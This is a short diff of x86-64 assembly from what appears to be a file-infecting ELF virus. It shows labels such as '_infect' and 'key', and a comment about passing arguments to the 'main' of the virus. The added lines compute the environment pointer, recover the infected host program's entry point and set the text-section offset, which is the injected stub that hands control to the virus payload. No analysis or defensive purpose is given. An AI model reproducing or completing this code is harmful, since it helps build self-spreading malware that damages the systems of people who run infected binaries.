@@ -2,9 +2,16 @@ section .textstart
 global _infect
 global size
 global memaddr
+
 global text_start
 global text_length
+
+global test_area
+global test_length
+
 global key
+
+global environ
 extern entry
 
 _infect:
@@ -16,6 +23,10 @@ size: db `00000000`
 text_start: db `00000000`
 text_length: db `00000000`
 key: db `0000000000000000`
+
+test_area: db `AAAAAAAA`
+
+environ: db `00000000`
 
 begin:
 	pop r15 ;size_t ac
@@ -40,18 +51,29 @@ begin:
 core:
 	push r15
 	push r14
+	
+	;set environ variable
+	add r15, 1
+	mov rax, r15
+	mov r15, 8
+	mul r15
+	add r14, rax
+	mov QWORD[rel environ], r14
 
+	;get entry_point of the program
 	mov r14, QWORD[rel diff]
 	lea rax, [rel _infect]
 	sub rax, r14
 	mov r14, rax
 
+	;set text_start
 	mov r13, QWORD[rel text_start]
 	lea rax, [rel _infect]
 	sub rax, r13
 	mov r13, rax
 	mov QWORD[rel text_start], r13
 
+	;pass params to "main" of virus
 	;rdi -> ac, rsi -> av
 	pop rsi ;ptr
 	pop rdi ;size
